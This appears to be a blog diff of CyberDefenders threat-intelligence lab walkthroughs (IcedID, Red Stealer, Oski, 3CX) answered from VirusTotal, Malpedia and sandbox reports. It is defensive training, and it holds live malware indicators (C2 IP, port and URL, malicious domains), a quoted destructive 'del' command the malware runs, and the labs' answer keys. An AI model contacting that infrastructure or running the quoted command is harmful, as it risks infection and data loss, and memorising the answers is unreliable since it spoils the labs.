+`Answer: https://gogohid.com`
+
+## 3. IcedID
+- **Date**: Oct 30, 2026
+- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 2
+- **Category**: Threat Intel
+
+We are presented with a malware hash `191eda0c539d284b29efe556abb05cd75a9077a0`, and we are prompted to gather intel on this malware using online platforms.
+
+**Q1. What is the name of the file associated with the given hash?**
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794198219949-c57506.png)
+
+`Answer: document-1982481273.xlsm`
+
+**Q2. Can you identify the filename of the GIF file that was deployed?**
+
+*Relations > Connected URLs*
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794199472749-092fe3.png)
+
+`Answer: 3003.gif`
+
+**Q3. How many domains does the malware look to download the additional payload file in Q2?**
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794200473506-781be1.png)
+
+`Answer: 5`
+
+**Q4. From the domains mentioned in Q3, a DNS registrar was predominantly used by the threat actor to host their harmful content, enabling the malware's functionality. Can you specify the Registrar INC of the domain that end with .com?**
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794200453116-59f1b0.png)
+
+From **Q2** and **Q3**, we can see that there is only one Contacted Domain overlaps with the Contacted URL that deploy the `3003.gif`, which is `tajushariya.com`. Its registrar is `NameCheap, Inc.`
+
+`Answer: NAMECHEAP`
+
+**Q5. Could you specify the threat actor linked to the sample provided?**
+
+According to this page [malpedia](https://malpedia.caad.fkie.fraunhofer.de/details/win.icedid), the threat actor behind IcedID is `GOLD CABIN`
+
+`Answer: GOLD CABIN`
+
+**Q6. In the Execution phase, what function does the malware employ to fetch extra payloads onto the system?**
+
+The malware is distributed on Microsoft Excel, Windows. On Windows, `URLDownloadToFile` is a common function for downloading an additional file onto the system. Here we need the ANSI version of it, `URLDownloadToFileA`. The A in the function means it expects those strings for the URL and file path.
+
+> Reference:
+> - https://www.fortinet.com/blog/threat-research/icedid-malware-analysis-part-two
+> - https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775123(v=vs.85)
+
+`Answer: URLDownloadToFileA`
+
+## 4. Red Stealer
+- **Date**: Nov 10, 2026
+- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 3
+- **Category**: Threat Intel
+
+We are presented with a malware hash `248FCC901AFF4E4B4C48C91E4D78A939BF681C9A1BC24ADDC3551B32768F907B`, and we are prompted to gather intel on this malware using online platforms.
+
+**Q1. Categorizing malware enables a quicker and clearer understanding of its unique behaviors and attack vectors. What category has Microsoft identified for that malware in VirusTotal?**
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794396882695-2b3cc7.png)
+
+With Microsoft's threat naming convention and categorization, Trojan should be the correct answer here.
+
+`Answer: Trojan`
+
+**Q2. Clearly identifying the name of the malware file improves communication among the SOC team. What is the file name associated with this malware? Note: Don't include the file extension in the name.**
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794397061680-8269e5.png)
+
+`Answer: Wextract`
+
+**Q3. Knowing the exact timestamp of when the malware was first observed can help prioritize response actions. Newly detected malware may require urgent containment and eradication compared to older, well-documented threats. What is the UTC timestamp of the malware's first submission to VirusTotal?**
+
+*Details > History > First Submission*
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794397386975-85f053.png)
+
+`Answer: 2023-10-06 04:41`
+
+**Q4. Understanding the techniques used by malware helps in strategic security planning. What is the MITRE ATT&CK technique ID for the malware collecting data from the local system prior to exfiltration?**
+
+Researching with such keywords from the question, I stumbled upon [MITRE ATT&CK technique ID T1005, Data from Local System](https://attack.mitre.org/techniques/T1005/)
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794397252708-ff5208.png)
+
+`Answer: T1005`
+
+**Q5. Following execution, the malware performs a connectivity check by resolving a well-known social-media domain before contacting its C2. Which single domain does it resolve for this check?**
+
+There are multiple traces of `facebook.com` in *Relations > Contacted URLs & Contacted Domains*
+
+`Answer: facebook.com`
+
+**Q6. Once the malicious IP addresses are identified, network security devices such as firewalls can be configured to block traffic to and from these addresses. Can you provide the IP address and destination port the malware communicates with?**
+
+*Behavior > Network Communication > IP Traffic & Memory Pattern URLs/IPs*
+
+`Answer: 77.91.124.55:19071`
+
+**Q7. YARA rules are designed to identify specific malware patterns and behaviors. Using MalwareBazaar, what's the name of the YARA rule created by "Varp0s" that detects the identified malware?**
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794404797829-207597.png)
+
+> **YARA** allows analysts to create custom descriptions, known as **YARA** rules, that capture the "DNA" of malware families. These rules combine textual strings, hexadecimal sequences, and regular expressions with Boolean logic. Instead of relying strictly on fragile file hashes (which change if a single byte is altered), **YARA** scans files, memory processes, or directories for specific code fragments, configurations, or behavioral patterns.
+
+
+Go to *MalwareBazaar > Browse* with the search syntax `sha256:248fcc901aff4e4b4c48c91e4d78a939bf681c9a1bc24addc3551b32768f907b`
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794404462724-c0558c.png)
+
+*Click on the only result found*
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794404624727-5e984c.png)
+
+*Go to YARA*
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794404669377-2f9a1b.png)
+
+`Answer: detect_Redline_Stealer`
+
+**Q8. Understanding which malware families are targeting the organization helps in strategic security planning for the future and prioritizing resources based on the threat. Can you provide the different malware alias associated with the malicious IP address according to Malpedia?**
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794404976274-3f674c.png)
+
+`Answer: RECORDSTEALER`
+
+**Q9. By identifying the malware's imported DLLs, we can configure security tools to monitor for the loading or unusual usage of these specific DLLs. Can you provide the DLL utilized by the malware for privilege escalation?**
+
+*Details > Portable Executable Info > Imports*
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794405053688-7cf042.png)
+
+Click on each imported DLLs to inspect them further.
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794405097986-ce4456.png)
+
+`ADVAPI32.dll` is seemingly used for privilege escalation, the others are irrelevant.
+
+> Reference: https://learn.microsoft.com/en-us/troubleshoot/windows-client/setup-upgrade-and-drivers/dynamic-link-library
+
+`Answer: ADVAPI32.dll`
+
+## 5. Oski
+- **Date**: Nov 10, 2026
+- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 3
+- **Category**: Threat Intel
+
+We are presented with a malware hash `12c1842c3ccafe7408c23ebf292ee3d9`, and we are prompted to gather intel on this malware using online platforms.
+
+**Q1. Determining the creation time of the malware can provide insights into its origin. What was the time of malware creation?**
+
+*Details > History > Creation Time*
+
+`Answer: 2022-09-28 17:40`
+
+**Q2. Identifying the command and control (C2) server that the malware communicates with can help trace back to the attacker. Which C2 server does the malware in the PPT file communicate with?**
+
+From *Relations > Contacted URLs | Behavior > Network Communication*, the C2 server that the malware commmunicates seems to be `http://171.22.28.221/5c06c05b7b34e8e6.php`.
+
+`Answer: http://171.22.28.221/5c06c05b7b34e8e6.php`
+
+**Q3. Identifying the initial actions of the malware post-infection can provide insights into its primary objectives. What is the first library that the malware requests post-infection?**
+
+From *Relations > Contacted URLs | Behavior > Network Communication*, the (first) library the malware requests is `sqlite3.dll`.
+
+`Answer: sqlite3.dll`
+
+**Q4. By examining the provided [Recorded Future Triage](https://tria.ge/260730-engzhayhja) report, what RC4 key is used by the malware to decrypt its base64-encoded string?**
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794409914324-342eef.png)
+
+`Answer: 5329514621441247975720749009`
+
+**Q5. By examining the MITRE ATT&CK techniques displayed in the [Any.run sandbox report](https://app.any.run/tasks/d55e2294-5377-4a45-b393-f5a8b20f7d44), identify the main MITRE technique (not sub-techniques) the malware uses to steal the user’s password.**
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794410067830-6b679f.png)
+
+`Answer: T1555`
+
+**Q6. By examining the child processes displayed in the [Any.run sandbox report](https://app.any.run/tasks/d55e2294-5377-4a45-b393-f5a8b20f7d44), which directory does the malware target for the deletion of all DLL files?**
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794410163073-354776.png)
+
+In `cmd.exe`, `del "C:\ProgramData\*.dll"` used the wildcard `*` to apply the deletion to all files in the folder `"C:\ProgramData\*.dll"`
+
+`Answer: C:\ProgramData`
+
+**Q7. Understanding the malware's behavior post-data exfiltration can give insights into its evasion techniques. By analyzing the child processes, after successfully exfiltrating the user's data, how many seconds does it take for the malware to self-delete?**
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794410315458-b5bb4e.png)
+
+There is a 5-second timeout in the deletion.
+
+`Answer: 5`
+
+## 6. 3CX Supply Chain
+- **Date**: Nov 12, 2026
 - **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 4
-- **Category**: Endpoint Forensics
+- **Category**: Threat Intel
+
+We are presented with a Windows Installer package `.msi`
+
+> MSI file is a standard database file used by Microsoft Windows to install, maintain, update, and remove software.
+
+**Q1. Understanding the scope of the attack and identifying which versions exhibit malicious behavior is crucial for making informed decisions if these compromised versions are present in the organization. How many versions of 3CX running on Windows have been flagged as malware?**
+
+The question prompts us to investigate public threat intelligence reports on the 3CX compromise via cybersecurity vendors, such as `Zscaler`, `Unit42`, `Mandiant`, `CrowdStrik`, or `SentinelOne`
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794468566913-f19c8c.png)
+
+There are two affected versions running on Windows.
+
+`Answer: 2`
+
+**Q2. Determining the age of the malware can help assess the extent of the compromise and track the evolution of malware families and variants. What's the UTC creation time of the .msi malware?**
+
+Upload the file onto VirusTotal and start inspecting.
+
+`Answer: 2023-03-13 06:33`
+
+**Q3. Executable files (.exe) are frequently used as primary or secondary malware payloads, while dynamic link libraries (.dll) often load malicious code or enhance malware functionality. Analyzing files deposited by the Microsoft Software Installer (.msi) is crucial for identifying malicious files and investigating their full potential. Which malicious DLLs were dropped by the .msi file?**
+
+There is a handful amount of `.dll` files upon inspecting `Files Dropped`
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794469051180-20a96f.png)
+
+Which of them is the malicious one, you may ask? We can inspect them further by taking their SHA256 to view it again on the very VirusTotal
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794469175340-703e20.png)
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794469331095-bcfaf4.png)
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794469301486-462f58.png)
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794469349581-f91132.png)
+
+As we can see,only the two files `ffmpeg.dll` and `d3dcompiler_47.dll` are marked as malicious (as trojans, to be precise), while the others are not harmful.
+
+`Answer: ffmpeg.dll,d3dcompiler_47.dll`
+
+**Q4. Recognizing the persistence techniques used in this incident is essential for current mitigation strategies and future defense improvements. What is the MITRE Technique ID employed by the .msi files to load the malicious DLL?**
+
+Search for the `3CX Supply Chain Attack` campaign.
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794472386279-263519.png)
+
+Reading further, there is a technique with a befitting description:
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794474081905-f8c1f2.png)
+
+`Answer: T1574`
+
+**Q5. Recognizing the malware type (threat category) is essential to your investigation, as it can offer valuable insight into the possible malicious actions you'll be examining. What is the threat category of the two malicious DLLs?**
+
+`Answer: Trojan`
+
+**Q6. As a threat intelligence analyst conducting dynamic analysis, it's vital to understand how malware can evade detection in virtualized environments or analysis systems. This knowledge will help you effectively mitigate or address these evasive tactics. What is the MITRE ID for the virtualization/sandbox evasion techniques used by the two malicious DLLs?**
+
+`Virtualization/Sandbox Evasion` falls below `Stealth` and `Discovery`.
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794474655960-56ae31.png)
+
+`Answer: T1497`
+
+**Q7. When conducting malware analysis and reverse engineering, understanding anti-analysis techniques is vital to avoid wasting time. Which hypervisor is targeted by the anti-analysis techniques in the ffmpeg.dll file?**
+
+Investigate the `ffmpeg.dll` on VirusTotal using its hash. Navigate to *Behavior > Capabilities*
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794475673568-0633ef.png)
+
+`Answer: VMware`
+
+**Q8. Identifying the cryptographic method used in malware is crucial for understanding the techniques employed to bypass defense mechanisms and execute its functions fully. What encryption algorithm is used by the ffmpeg.dll file?**
+
+Such cryptographic method can be seen in the previous image, but you can see it on a [cybersecurity vendor](https://unit42.paloaltonetworks.com/3cxdesktopapp-supply-chain-attack/), too.
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794475810235-b70aed.png)
+
+`Answer: RC4`
+
+**Q9. As an analyst, you've recognized some TTPs involved in the incident, but identifying the APT group responsible will help you search for their usual TTPs and uncover other potential malicious activities. Which group is responsible for this attack?**
+
+The question asks for the threat actor, so I naturally went to `Malpedia`.
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794468874543-884af4.png)
+
+`Answer: Lazarus`
+
+
 
 
 
